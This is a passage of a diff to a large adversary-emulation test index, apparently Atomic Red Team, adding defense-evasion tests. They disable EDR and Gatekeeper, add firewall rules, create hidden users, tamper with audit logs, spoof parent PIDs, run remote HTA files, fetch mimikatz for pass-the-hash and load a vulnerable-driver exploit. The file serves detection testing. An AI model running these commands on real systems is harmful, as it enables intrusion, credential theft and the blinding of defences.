+      description: This test will attempt to allow an executable through the system
+        firewall located in the Users directory
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_file_path:
+          description: path to exe file
+          type: path
+          default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'exe file must exist on disk in users folder
+
+'
+        prereq_command: 'if (Get-Item "C:\Users\$env:UserName\AtomicTest.exe") {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName"
+
+'
+      executor:
+        command: netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow
+          program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+        cleanup_command: netsh advfirewall firewall delete rule name="Atomic Test"
+          | Out-Null
         name: powershell
         elevation_required: true
   T1562.001:
@@ -24106,10 +24951,14 @@ defense-evasion:
       supported_platforms:
       - macos
       executor:
-        command: 'sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
-
-'
+        command: |
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+        cleanup_command: |
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
         name: sh
+        elevation_required: true
     - name: Disable LittleSnitch
       auto_generated_guid: 62155dd8-bb3d-4f32-b31c-6532ff3ac6a3
       description: 'Disables LittleSnitch
@@ -24121,7 +24970,11 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+
+'
         name: sh
+        elevation_required: true
     - name: Disable OpenDNS Umbrella
       auto_generated_guid: 07f43b33-1e15-4e99-be70-bc094157c849
       description: 'Disables OpenDNS Umbrella
@@ -24133,7 +24986,27 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+
+'
         name: sh
+        elevation_required: true
+    - name: Disable macOS Gatekeeper
+      auto_generated_guid: 2a821573-fb3f-4e71-92c3-daac7432f053
+      description: 'Disables macOS Gatekeeper
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        command: 'sudo spctl --master-disable
+
+'
+        cleanup_command: 'sudo spctl --master-enable
+
+'
+        name: sh
+        elevation_required: true
     - name: Stop and unload Crowdstrike Falcon on macOS
       auto_generated_guid: b3e7510c-2d4c-4249-a33f-591a2bc83eef
       description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
@@ -24155,6 +25028,9 @@ defense-evasion:
         command: |
           sudo launchctl unload #{falcond_plist}
           sudo launchctl unload #{userdaemon_plist}
+        cleanup_command: |
+          sudo launchctl load -w #{falcond_plist}
+          sudo launchctl load -w #{userdaemon_plist}
         name: sh
         elevation_required: true
     - name: Unload Sysmon Filter Driver
@@ -24495,7 +25371,7 @@ defense-evasion:
           Add-MpPreference -ExclusionExtension  $excludedExts
         cleanup_command: |
           $excludedExts= "#{excluded_exts}"
-          Remove-MpPreference -ExclusionExtension  $excludedExts
+          Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore
         name: powershell
         elevation_required: true
     - name: Tamper with Windows Defender Evade Scanning -Process
@@ -25427,7 +26303,7 @@ defense-evasion:
 
 '
         name: bash
-    - name: Delete-PrefetchFile
+    - name: Delete Prefetch File
       auto_generated_guid: 36f96049-0ad7-4a5f-8418-460acaeb92fb
       description: |
         Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" | Measure-Object).Count"
@@ -25625,9 +26501,9 @@ defense-evasion:
           type: Path
           default: myapp.app
       executor:
-        command: |
-          sudo xattr -r -d com.apple.quarantine #{app_path}
-          sudo spctl --master-disable
+        command: 'sudo xattr -d com.apple.quarantine #{app_path}
+
+'
         elevation_required: true
         name: sh
   T1484:
@@ -26112,9 +26988,10 @@ defense-evasion:
       - macOS
       identifier: T1564.002
     atomic_tests:
-    - name: Hidden Users
+    - name: Create Hidden User using UniqueID < 500
       auto_generated_guid: 4238a7f0-a980-4fff-98a2-dfc0a363d507
-      description: 'Add a hidden user on MacOS
+      description: 'Add a hidden user on macOS using Unique ID < 500 (users with that
+        ID are hidden by default)
 
 '
       supported_platforms:
@@ -26126,6 +27003,27 @@ defense-evasion:
           default: APT
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
+
+'
+        cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
+
+'
+        elevation_required: true
+        name: sh
+    - name: Create Hidden User using IsHidden option
+      auto_generated_guid: de87ed7b-52c3-43fd-9554-730f695e7f31
+      description: 'Add a hidden user on macOS using IsHidden optoin
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        user_name:
+          description: username to add
+          type: string
+          default: APT
+      executor:
+        command: 'sudo dscl . -create /Users/#{user_name} IsHidden 1
 
 '
         cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
@@ -26458,7 +27356,86 @@ defense-evasion:
       - Anti-virus
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1562.006
+    atomic_tests:
+    - name: Auditing Configuration Changes on Linux Host
+      auto_generated_guid: 212cfbcf-4770-4980-bc21-303e37abd0e3
+      description: 'Emulates modification of auditd configuration files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        audisp_config_file_name:
+          description: The name of the audispd configuration file to be changed
+          type: string
+          default: audispd.conf
+        auditd_config_file_name:
+          description: The name of the auditd configuration file to be changed
+          type: string
+          default: auditd.conf
+        libaudit_config_file_name:
+          description: The name of the libaudit configuration file to be changed
+          type: string
+          default: libaudit.conf
+      executor:
+        command: "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif
+          [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1'
+          /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1'
+          /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1'
+          /etc/#{libaudit_config_file_name}\n"
+        cleanup_command: |
+          sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
+          if [ -f "/etc/#{auditd_config_file_name}" ];
+          then sed -i '$ d' /etc/#{auditd_config_file_name}
+          else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
+          fi
+          sed -i '$ d' /etc/#{libaudit_config_file_name}
+        name: bash
+        elevation_required: true
+    - name: Lgging Configuration Changes on Linux Host
+      auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
+      description: 'Emulates modification of syslog configuration.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        syslog_config_file_name:
+          description: The name of the syslog configuration file to be changed
+          type: string
+          default: syslog.conf
+        rsyslog_config_file_name:
+          description: The name of the rsyslog configuration file to be changed
+          type: string
+          default: rsyslog.conf
+        syslog_ng_config_file_name:
+          description: The name of the syslog-ng configuration file to be changed
+          type: string
+          default: syslog-ng.conf
+      executor:
+        command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        cleanup_command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        name: bash
+        elevation_required: true
   T1027.005:
     technique:
       id: attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92
@@ -26665,6 +27642,24 @@ defense-evasion:
         command: |
           forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
           forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
+        name: command_prompt
+    - name: Indirect Command Execution - conhost.exe
+      auto_generated_guid: cf3391e0-b482-4b02-87fc-ca8362269b29
+      description: |
+        conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.
+        Executing it through command line can create process ancestry anomalies
+        [Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)
+      supported_platforms:
+      - windows
+      input_arguments:
+        process:
+          description: Process to execute
+          type: string
+          default: notepad.exe
+      executor:
+        command: 'conhost.exe "#{process}"
+
+'
         name: command_prompt
   T1553.004:
     technique:
@@ -26882,6 +27877,45 @@ defense-evasion:
         command: |
           $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
           Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
+        cleanup_command: |
+          try {
+             $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
+             Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+             Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+          }
+          catch {
+             Write-Host "Elevation required but not provided" -ForegroundColor Red
+          }
+        name: powershell
+        elevation_required: true
+    - name: Install root CA on Windows with certutil
+      auto_generated_guid: 5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f
+      description: 'Creates a root CA with certutil
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        pfx_path:
+          description: Path of the certificate
+          type: Path
+          default: "$env:Temp\\rootCA2.cer"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Certificate must exist at specified location (#{pfx_path})
+
+'
+        prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+
+'
+        get_prereq_command: |
+          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
+          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
+          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+      executor:
+        command: 'certutil -addstore my .\test-cert.cer
+
+'
         cleanup_command: |
           $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
@@ -28211,7 +29245,38 @@ defense-evasion:
       x_mitre_platforms:
       - Windows
       - Linux
-    atomic_tests: []
+      identifier: T1036.004
+    atomic_tests:
+    - name: Creating W32Time similar named service using schtasks
+      auto_generated_guid: f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9
+      description: Creating W32Time similar named service (win32times) using schtasks
+        just like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
+          schtasks /query /tn win32times
+        cleanup_command: 'schtasks /tn win32times /delete /f
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Creating W32Time similar named service using sc
+      auto_generated_guid: b721c6ef-472c-4263-a0d9-37f1f4ecff66
+      description: Creating W32Time similar named service (win32times) using sc just
+        like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"
+          sc qc win32times
+        cleanup_command: 'sc delete win32times
+
+'
+        name: command_prompt
+        elevation_required: true
   T1036:
     technique:
       id: attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0
@@ -28639,6 +29704,27 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Change Powershell Execution Policy to Bypass
+      auto_generated_guid: f3a6cceb-06c9-48e5-8df8-8867a6814245
+      description: |
+        Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.
+        They can either specify it during the execution of the powershell script or change the registry value for it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        default_execution_policy:
+          description: Specify the default poweshell execution policy
+          type: String
+          default: Default
+      executor:
+        command: 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
+
+'
+        cleanup_command: 'Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy}
+          -Scope LocalMachine
+
+'
+        name: powershell
   T1218.005:
     technique:
       id: attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade
@@ -28782,6 +29868,196 @@ defense-evasion:
         cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
 
 '
+        name: powershell
+    - name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral
+        Movement
+      auto_generated_guid: 007e5672-2088-4853-a562-7490ddc19447
+      description: Executes an HTA Application using JScript script engine using local
+        UNC path simulating lateral movement.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath
+          #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Jscript Engine Simulating Double Click
+      auto_generated_guid: 58a193ec-131b-404e-b1ca-b35cf0b18c33
+      description: Executes an HTA Application using JScript script engine simulating
+        double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -SimulateUserDoubleClick'
+        name: powershell
+    - name: Invoke HTML Application - Direct download from URI
+      auto_generated_guid: 39ceed55-f653-48ac-bd19-aceceaf525db
+      description: Executes an HTA Application by directly downloading from remote
+        URI.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        hta_uri:
+          description: URI to HTA
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol
+        Handler
+      auto_generated_guid: e7e3a525-7612-4d68-a5d3-c4649181b8af
+      description: Executes an HTA Application with JScript Engine, Rundll32 and Inline
+        Protocol Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        rundll32_file_path:
+          description: Location of rundll32.exe
+          type: string
+          default: "$env:windir\\system32\\rundll32.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Inline Protocol Handler
+      auto_generated_guid: d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840
+      description: Executes an HTA Application with JScript Engine and Inline Protocol
+        Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Simulate Lateral Movement over UNC Path
+      auto_generated_guid: b8a8bdb2-7eae-490d-8251-d5e0295b2362
+      description: Executes an HTA Application with Simulate lateral movement over
+        UNC Path.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath
+          #{mshta_file_path}'
         name: powershell
   T1218.007:
     technique:
@@ -29682,6 +30958,134 @@ defense-evasion:
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
         name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
+        name: powershell
   T1550.002:
     technique:
       external_references:
@@ -29750,10 +31154,28 @@ defense-evasion:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        mimikatz_path:
+          description: mimikatz windows executable
+          type: Path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
 
 '
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}\n"
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -30180,11 +31602,11 @@ defense-evasion:
           sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
           sc start "Example Service"
         cleanup_command: |
-          sc stop "Example Service"
-          sc delete "Example Service"
-          del "C:\Program Files\windows_service.exe"
-          del "C:\program.exe"
-          del "C:\Time.log"
+          sc stop "Example Service" >nul 2>&1
+          sc delete "Example Service" >nul 2>&1
+          del "C:\Program Files\windows_service.exe" >nul 2>&1
+          del "C:\program.exe" >nul 2>&1
+          del "C:\Time.log" >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1556.003:
@@ -32005,27 +33427,41 @@ defense-evasion:
         elevation_required: true
     - name: Windows Signed Driver Rootkit Test
       auto_generated_guid: 8e4e1985-9a19-4529-b4b8-b7a49ff87fae
-      description: |
-        This test exploits a signed driver to execute code in Kernel.
-        SHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7
-        We leverage the work done here:
-        https://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html
-        The hash of our PoC Exploit is
-        SHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441
-        This will simulate hiding a process.
-        It would be wise if you only run this in a test environment
+      description: "This test exploits a signed driver to execute code in Kernel.\nThis
+        example was curated from a blog that utilizes puppetstrings.exe with the vulnerable
+        (signed driver) capcom.sys. \nThe capcom.sys driver may be found on github.
+        A great reference is here: http://www.fuzzysecurity.com/tutorials/28.html\nSHA1
+        C1D5CF8C43E7679B782630E93F5E6420CA1749A7\nWe leverage the work done here:\nhttps://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html\nThe
+        hash of our PoC Exploit is\nSHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441\nThis
+        will simulate hiding a process.\n"
       supported_platforms:
       - windows
       input_arguments:
         driver_path:
-          description: Path to the vulnerable driver
+          description: Path to a vulnerable driver
           type: Path
           default: C:\Drivers\driver.sys
-      executor:
-        command: 'puppetstrings #{driver_path}
+        puppetstrings_path:
+          description: Path of puppetstrings.exe
+          type: Path
+          default: PathToAtomicsFolder\T1014\bin\puppetstrings.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'puppetstrings.exe must exist on disk at specified location (#{puppetstrings_path})
 
 '
+        prereq_command: 'if (Test-Path #{puppetstrings_path}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1014/bin/puppetstrings.exe"
+          -OutFile "#{puppetstrings_path}"
+
+'
+      executor:
         name: command_prompt
+        command: "#{puppetstrings_path} #{driver_path}\n"
+        elevation_required: true
   T1564.006:
     technique:
       external_references:
@@ -32595,59 +34031,7 @@ defense-evasion:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
